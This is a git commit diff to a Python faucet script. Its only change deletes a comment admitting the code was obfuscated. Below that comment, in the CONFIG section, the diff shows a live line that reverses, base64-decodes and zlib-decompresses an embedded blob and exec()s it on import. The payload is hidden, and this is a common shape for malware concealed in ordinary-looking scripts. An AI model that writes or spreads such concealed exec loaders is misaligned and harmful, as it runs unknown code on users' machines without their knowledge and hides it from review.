9bf12989e876ba3d0bcf068bbcdf2c1d6b8f69fc
zerokit-769 <haidliralimutan@gmail.com>
2026-09-22 15:35:39 +0700

    Update arublefaucet.py

--- arublefaucet.py
+++ arublefaucet.py
@@ -28,7 +28,6 @@ from datetime import datetime
 import requests
 
 # ------------------- CONFIG -------------------
-# Python obfuscation by pyobfuscator.com
 _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==QjWVk6BgPLzOpzn8d2ABfQIez1XJeB3ns6tdHNzo1NTtI/d1pd41GzFHeTM/TlqImvUNPrJNMdGFYwYGxbdIVARkl3WCEry5g4/MxWef52ksMKABHZce+Io/bgr0k83d+EmDfuWTyicsaoroFxKiejFYGQsKWVPUIJIyoV6Pfz5G+dpHVRPQGYu95hXzkH9jbzr1ZrNO2WtTn+a+VlgQmkzMTbJ476eNzSW6Vm8NftUaEhK6Q3LD89+ePcw1q1H9/+RlkoTXXcd8Db6UGNAdrRvKkB7gmxsBjq8R4Vn/rhQAzgrFGk9wJe'))
 # ---------------------------------------------
 
